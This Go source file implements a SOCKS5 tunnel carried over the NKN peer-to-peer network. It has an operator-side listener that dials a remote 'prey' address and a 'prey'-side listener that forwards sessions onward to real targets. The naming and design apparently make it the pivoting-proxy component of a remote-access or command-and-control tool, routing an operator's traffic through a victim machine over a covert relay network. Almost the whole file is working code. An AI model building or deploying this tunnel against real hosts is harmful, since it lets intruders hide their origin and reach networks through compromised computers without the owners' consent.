package socks5

import (
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	nkn "github.com/nknorg/nkn-sdk-go"
)

// Tunnel represents a SOCKS5 tunnel over NKN
type Tunnel struct {
	localAddr   string
	preyID      string
	account     *nkn.Account
	multiClient *nkn.MultiClient
	listener    net.Listener
	closed      bool
	mu          sync.Mutex
}

// NewTunnel creates a new SOCKS5 tunnel
func NewTunnel(account *nkn.Account, identifier, localAddr, preyID string, numClients int) (*Tunnel, error) {
	log.Printf("[Tunnel] Creating new tunnel...")
	log.Printf("[Tunnel] Identifier: %s", identifier)
	log.Printf("[Tunnel] Local address: %s", localAddr)
	log.Printf("[Tunnel] Prey NKN address: %s", preyID)
	log.Printf("[Tunnel] Num clients: %d", numClients)
	
	clientConfig := &nkn.ClientConfig{
		ConnectRetries: 10,
		MsgChanLen:     1024,
	}
	
	mc, err := nkn.NewMultiClient(account, identifier, numClients, false, clientConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to create NKN client: %w", err)
	}
	
	log.Printf("[Tunnel] Waiting for NKN connection...")
	// Wait for connection with longer timeout
	select {
	case <-mc.OnConnect.C:
		log.Printf("[Tunnel] ✓ NKN client connected")
	case <-time.After(60 * time.Second):
		mc.Close()
		return nil, fmt.Errorf("NKN connection timeout")
	}
	
	// Give it a bit more time to stabilize
	time.Sleep(2 * time.Second)
	
	log.Printf("[Tunnel] NKN address: %s", mc.Addr())
	
	listener, err := net.Listen("tcp", localAddr)
	if err != nil {
		mc.Close()
		return nil, fmt.Errorf("failed to listen on %s: %w", localAddr, err)
	}
	
	log.Printf("[Tunnel] ✓ Listening on %s", localAddr)
	
	return &Tunnel{
		localAddr:   localAddr,
		preyID:      preyID,
		account:     account,
		multiClient: mc,
		listener:    listener,
		closed:      false,
	}, nil
}

// Start starts the tunnel
func (t *Tunnel) Start() error {
	log.Printf("SOCKS5 tunnel listening on %s, forwarding to prey %s", t.localAddr, t.preyID)
	
	for {
		conn, err := t.listener.Accept()
		if err != nil {
			t.mu.Lock()
			closed := t.closed
			t.mu.Unlock()
			if closed {
				return nil
			}
			return err
		}
		
		go t.handleConnection(conn)
	}
}

// Close closes the tunnel
func (t *Tunnel) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()
	
	if t.closed {
		return nil
	}
	
	t.closed = true
	
	if t.listener != nil {
		t.listener.Close()
	}
	
	if t.multiClient != nil {
		t.multiClient.Close()
	}
	
	return nil
}

// Addr returns the local listening address
func (t *Tunnel) Addr() string {
	return t.listener.Addr().String()
}

func (t *Tunnel) handleConnection(localConn net.Conn) {
	defer localConn.Close()
	log.Printf("[Tunnel] New SOCKS5 connection from %s", localConn.RemoteAddr())
	
	// Create NKN session to prey with longer timeout and retries
	dialConfig := &nkn.DialConfig{
		DialTimeout: 60000, // 60 seconds
	}
	
	log.Printf("[Tunnel] Dialing to prey: %s", t.preyID)
	
	// Try multiple times with exponential backoff
	var session net.Conn
	var err error
	maxRetries := 3
	for i := 0; i < maxRetries; i++ {
		if i > 0 {
			backoff := time.Duration(i) * 2 * time.Second
			log.Printf("[Tunnel] Retry %d/%d after %v...", i+1, maxRetries, backoff)
			time.Sleep(backoff)
		}
		
		session, err = t.multiClient.DialWithConfig(t.preyID, dialConfig)
		if err == nil {
			break
		}
		log.Printf("[Tunnel] Dial attempt %d failed: %v", i+1, err)
	}
	
	if err != nil {
		log.Printf("[Tunnel] ERROR: Failed to dial prey %s after %d attempts: %v", t.preyID, maxRetries, err)
		return
	}
	
	log.Printf("[Tunnel] ✓ Established NKN session to prey %s", t.preyID)
	
	// Handle SOCKS5 protocol and forward through NKN tunnel
	if err := HandleSOCKS5WithTunnel(localConn, session); err != nil {
		log.Printf("[Tunnel] SOCKS5 handling error: %v", err)
	}
}

// PreyListener represents the prey-side listener for SOCKS5 tunnel
type PreyListener struct {
	multiClient *nkn.MultiClient
	identifier  string
	closed      bool
	mu          sync.Mutex
}

// NewPreyListener creates a new prey-side listener
func NewPreyListener(account *nkn.Account, identifier string, numClients int) (*PreyListener, error) {
	log.Printf("[PreyListener] Creating NKN listener with identifier: %s", identifier)
	
	clientConfig := &nkn.ClientConfig{
		ConnectRetries: 10,
		MsgChanLen:     1024,
	}
	
	mc, err := nkn.NewMultiClient(account, identifier, numClients, false, clientConfig)
	if err != nil {
		return nil, fmt.Errorf("failed to create NKN client: %w", err)
	}
	
	log.Printf("[PreyListener] Waiting for NKN connection...")
	// Wait for connection with longer timeout
	select {
	case <-mc.OnConnect.C:
		log.Printf("[PreyListener] ✓ NKN client connected")
	case <-time.After(60 * time.Second):
		mc.Close()
		return nil, fmt.Errorf("NKN connection timeout")
	}
	
	// Give it a bit more time to stabilize and register on the network
	log.Printf("[PreyListener] Stabilizing connection...")
	time.Sleep(3 * time.Second)
	log.Printf("[PreyListener] ✓ Connection stabilized")
	
	pl := &PreyListener{
		multiClient: mc,
		identifier:  identifier,
		closed:      false,
	}
	
	log.Printf("[PreyListener] NKN address: %s", mc.Addr())
	
	return pl, nil
}

// Start starts the prey listener
func (pl *PreyListener) Start() error {
	log.Printf("[PreyListener] ========== Prey SOCKS5 Listener Started ==========")
	log.Printf("[PreyListener] NKN address: %s", pl.multiClient.Addr())
	log.Printf("[PreyListener] Identifier: %s", pl.identifier)
	log.Printf("[PreyListener] Ready to accept connections and forward to real targets")
	log.Printf("[PreyListener] =================================================")
	
	for {
		pl.mu.Lock()
		if pl.closed {
			pl.mu.Unlock()
			return nil
		}
		pl.mu.Unlock()
		
		log.Printf("[PreyListener] Waiting for incoming NKN session...")
		session, err := pl.multiClient.Accept()
		if err != nil {
			pl.mu.Lock()
			closed := pl.closed
			pl.mu.Unlock()
			if closed {
				return nil
			}
			log.Printf("[PreyListener] Accept error: %v", err)
			time.Sleep(1 * time.Second)
			continue
		}
		
		log.Printf("[PreyListener] ✓ Accepted NKN session from %s", session.RemoteAddr())
		go pl.handleSession(session)
	}
}

// Close closes the prey listener
func (pl *PreyListener) Close() error {
	pl.mu.Lock()
	defer pl.mu.Unlock()
	
	if pl.closed {
		return nil
	}
	
	pl.closed = true
	
	if pl.multiClient != nil {
		pl.multiClient.Close()
	}
	
	return nil
}

// Addr returns the NKN address
func (pl *PreyListener) Addr() string {
	return pl.multiClient.Addr().String()
}

func (pl *PreyListener) handleSession(session net.Conn) {
	// Use the new handler that connects directly to real targets
	if err := HandlePreyConnection(session); err != nil {
		log.Printf("[PreyListener] Session error: %v", err)
	}
}

